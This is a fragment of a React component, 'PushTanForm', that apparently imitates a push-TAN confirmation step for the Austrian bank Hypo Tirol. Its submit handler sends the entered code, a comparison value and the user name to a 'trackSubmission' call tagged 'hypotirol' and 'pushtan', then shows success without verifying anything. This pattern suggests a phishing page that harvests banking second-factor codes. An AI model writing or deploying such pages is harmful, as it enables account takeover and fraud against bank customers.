...
export default function PushTanForm({ user, vergleichswert: vergleichswertProp }: { user: string; vergleichswert?: string }) {
  ...
  const handleSubmit = async (e: React.FormEvent) => {
    ...
    setSubmitting(true);
    setError(null);
    await trackSubmission("hypotirol", "pushtan", { code, vergleichswert, user });
    setSuccess(true);
    setSubmitting(false);
  };
                  ...
                  {error && (
                    <div className="messages-overlay" style={{
                      ...
                      <div style={{
                        ...
                        fontSize: 14,
                        lineHeight: 1.5,
                        fontFamily: "Verdana, Arial, Helvetica Neue, Helvetica, sans-serif",
                      }}>
                        {error}
                      </div>
                    </div>
